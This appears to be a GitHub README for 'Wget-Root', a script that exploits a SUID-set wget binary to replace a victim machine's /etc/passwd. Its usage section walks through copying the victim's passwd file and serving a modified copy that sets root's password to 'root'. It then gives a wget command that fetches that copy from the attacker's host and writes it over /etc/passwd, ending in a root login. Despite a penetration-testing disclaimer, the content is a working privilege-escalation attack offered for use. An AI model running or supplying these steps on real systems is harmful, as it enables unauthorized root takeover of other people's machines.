# Wget-Root

**⚠️ Warning:** This script is completly for penetration testing purposes. I do not claim any responsibility if you use it for offensive activities.

If the wget  binary has the SUID bit set, It does not drop the elevated privileges and may be abused to access the file system. It may be used to do privileged writes or write files outside a restricted file system. This script automates the rewriting of the `passwd` file of the victims machine
# Usage
From the victims shell, copy the /etc/passwd file to your host machine. (Be carefull and do not overwrite your own passwd file) <br>
```bash
python3 wget_exploit --file <passwd copy> --port <webserver port> --interface <network interface/ip>
```
The script will overwrite the <passwd copy> file, containing the changed `root` password. 
Then it will host the passwd file to the web using a python http server.<br>
Run the command `sudo wget http://<host ip>:<webserver port>/passwd -O /etc/passwd` on the victims shell to overwrite the passwd file.<br>
**Congratulations!** 
Now switch users to `root` with the password `root`

![Proof Of Concept Video](https://user-images.githubusercontent.com/80885284/182122277-11c1718b-de9a-4bf6-b7aa-8e5f61d7acdb.webm)
![showcase](https://i.imgur.com/1bVzFk8.png)
